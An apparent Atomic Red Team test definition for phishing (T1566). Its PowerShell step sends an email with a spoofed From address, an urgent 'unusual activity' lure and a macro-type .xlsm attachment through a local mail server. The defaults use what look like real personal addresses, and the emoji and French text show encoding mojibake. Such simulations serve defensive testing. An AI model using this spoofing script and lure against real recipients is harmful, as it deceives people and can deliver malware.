attack_technique: T1566
display_name: Phishing
atomic_tests:
  - name: Phishing email with spoofed From (via hMailServer)
    description: Simulate phishing email sent through local SMTP server with spoofed sender.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: SMTP server address
        type: String
        default: "127.0.0.1"
      smtp_port:
        description: SMTP server port
        type: Integer
        default: 25
      sender_email:
        description: Real sender email address (used internally by hMailServer)
        type: String
        default: "oumayma@pfe.com"
      sender_visible_email:
        description: Spoofed visible From address
        type: String
        default: "chaymabouattour@ieee.org"
      recipient_email:
        description: Gmail recipient
        type: String
        default: "oumaymakabadou2@gmail.com"
      subject:
        description: Email subject
        type: String
        default: "‚ö†Ô∏è Urgent: Please review the attached document"
      body:
        description: Email body (HTML)
        type: String
        default: "Dear User,<br>We detected unusual activity. Please review the attached file.<br>Thanks."
      attachment_path:
        description: Attachment path
        type: String
        default: "C:\\temp\\PhishingAttachment.xlsm"
    executor:
      name: powershell
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = #{smtp_port}
        $senderReal = "#{sender_email}"
        $senderVisible = "#{sender_visible_email}"
        $recipient = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachment = "#{attachment_path}"

        Write-Host "üì® Envoi d'un email avec From: falsifi√© via hMailServer..."

        try {
            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort `
                -From $senderVisible -To $recipient `
                -Subject $subject -BodyAsHtml $body `
                -Attachments $attachment `
                -ErrorAction Stop
            Write-Host "‚úÖ Email envoy√© avec succ√®s."
        } catch {
            Write-Host "‚ùå √âchec de l'envoi de l'email : $_"
        }
